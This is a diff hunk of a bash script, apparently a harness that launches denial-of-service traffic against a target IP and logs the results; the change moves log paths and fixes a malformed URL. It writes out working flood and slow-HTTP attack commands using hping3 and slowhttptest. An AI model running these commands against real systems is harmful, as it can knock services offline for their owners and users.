@@ -12,24 +12,24 @@ trap crash 0
 
 #Define variables
 attack_type=$1
-curl_log="/home/logs/"$attack_type"_curl.log"
-traceroute_log="/home/logs/"$attack_type"_traceroute.log"
-attack_log="/home/logs/"$attack_type".log"
+curl_log="/home/output/logs/"$attack_type"_curl.log"
+traceroute_log="/home/output/logs/"$attack_type"_traceroute.log"
+attack_log="/home/output/logs/"$attack_type".log"
 attack_duration=$2 # in seconds
 destination_ip=$3
-attack_stats_log1="/home/logs/"$attack_type"1_stats.log"
-attack_stats_log2="/home/logs/"$attack_type"2_stats.log"
-attack_stats_log3="/home/logs/"$attack_type"3_stats.log"
-attack_stats_log4="/home/logs/"$attack_type"4_stats.log"
-attack_stats_log5="/home/logs/"$attack_type"5_stats.log"
-attack_stats_log6="/home/logs/"$attack_type"6_stats.log"
-attack_stats_log7="/home/logs/"$attack_type"7_stats.log"
-attack_stats_log8="/home/logs/"$attack_type"8_stats.log"
-attack_stats_log9="/home/logs/"$attack_type"9_stats.log"
+attack_stats_log1="/home/output/logs/"$attack_type"1_stats.log"
+attack_stats_log2="/home/output/logs/"$attack_type"2_stats.log"
+attack_stats_log3="/home/output/logs/"$attack_type"3_stats.log"
+attack_stats_log4="/home/output/logs/"$attack_type"4_stats.log"
+attack_stats_log5="/home/output/logs/"$attack_type"5_stats.log"
+attack_stats_log6="/home/output/logs/"$attack_type"6_stats.log"
+attack_stats_log7="/home/output/logs/"$attack_type"7_stats.log"
+attack_stats_log8="/home/output/logs/"$attack_type"8_stats.log"
+attack_stats_log9="/home/output/logs/"$attack_type"9_stats.log"
 
 attack_script1="hping3 --flood --udp -p $destination_port $destination_ip"
 attack_script2="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http://$destination_ip -x 24 -p 3"
-attack_script3="slowhttptest -R -g -c 1000 -a 10 -b 3000 -r 500 -t HEAD -u http:/$destination_ip"
+attack_script3="slowhttptest -R -g -c 1000 -a 10 -b 3000 -r 500 -t HEAD -u http://$destination_ip"
 attack_script4="hping3 --flood -1 $destination_ip"
 attack_script5="slowhttptest -c 1000 -X -g -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://$destination_ip -p 3"
 attack_script6="hping3 -1 --flood -C 3 -K 3 $destination_ip"
